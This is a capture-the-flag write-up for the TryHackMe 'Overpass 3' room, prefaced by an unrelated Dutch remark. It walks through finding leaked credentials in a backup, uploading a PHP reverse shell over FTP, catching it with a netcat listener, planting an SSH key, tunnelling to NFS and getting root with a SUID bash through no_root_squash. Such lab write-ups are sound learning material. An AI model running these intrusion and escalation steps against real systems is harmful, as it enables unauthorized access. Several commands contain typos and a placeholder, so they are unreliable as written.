```niemand boeit er wat er in noord korea gebeurd, waarom zou afganistan oppeens anders zijn
Ehh?
room: https://tryhackme.com/room/overpass3hosting
Style: Unguided
Difficulty: Medium
```
1. Run nmap

2. Run Gobuster
we find an interesting folder called Backup. We download, unzip and inspect the files
```
unzip backup.zip
└─$ file priv.key4
priv.key: PGP private key block

└─$ file CustomerDetails.xlsx.gpg
CustomerDetails.xlsx.gpg: PGP RSA encrypted session key - keyid: 9E86A1C6 3FB96335 RSA (Encrypt or Sign) 2048b .
```

Here we find a Pretty Good Privacy (PGP) encrypted file, but luckily it also includes the private key. To be able to decrypt it, we first have to import the Private key into our GPG (OpenPGP encryption and signing tool).

```
gpg --import ./priv.key
pgp --decrypt CustomerDetails.xlsx.pgp > details.xlsx
```

Now we have a decrypted excel file, lets see if LibreOffice can open this file.

``libreoffice details.xslx``

Here we find some usernames and passwords, lets see what we can do with those.

We can login to the FTP using the "paradox" user, password: ShibesAreGreat123

Put doesnt seem to work, however mput allows me to upload files;

so we prepare a php reverse shell, and open a socket for us to receive the shell:

``rlwrap nc -lvnp 4444``

We open the file directly and voilla, we have a shell on the machine!

I ran linpeas, this is the most interesting snippet ;
``/home/james *(rw,fsid=0,sync,no_root_squash,insecure)no``

With the FTP password for paradox, we try to pivot to his user. This seems to work!

From here i added my own ssh pub key to the authorized_keys list and opened a normal ssh session.
    ~~INSERT HOWTO~~

After that i could SSH into the machine, i would think back to that possible NFS mount we saw linpeas report earlier;
``/home/james *(rw,fsid=0,sync,no_root_squash,insecure)no``

Trying to mount this on my local machine failed, because port 2049 was filtered so not accesible on the outside.
Since we do have an SSH connection, why not make a SSH tunnel and mount through that?

To setup an SSH tunnel, i used this command:
``ssh -fNv4 -L 3049:10.10.177.2:2049 paradox@10.10.177.2``

after we've completedly setup the tunnel lets try to mount this thing locally. Since we dont have access to port 111, we will have to force NFSv4 because all the others require the portmapper service.

```
sudo mount -t nfs 127.0.0.1:/ /tmp/nfs/  --verbose -o port=3049,vers=4.1
###note that without ,vers=4.1 it did not work, even when calling nfs4.
```

Took me a while to figure out you were not supposed to add /home/james to the folder but use the base of the share, which is already /home/james/.
Eventually we mounted the /home/james folder on our local machine through the SSH tunnel, which is pretty neat.

this shows us user.txt for james, and we can answer question #2

Now since no_root_squash is enabled, we can upload a bash binary owned by `root` with the suid set so it will also execute as root when copied onto the nfs mount.

``./bash -p ``

Gives us a Root bash and we can read /root/root.flag and finish the challenge.
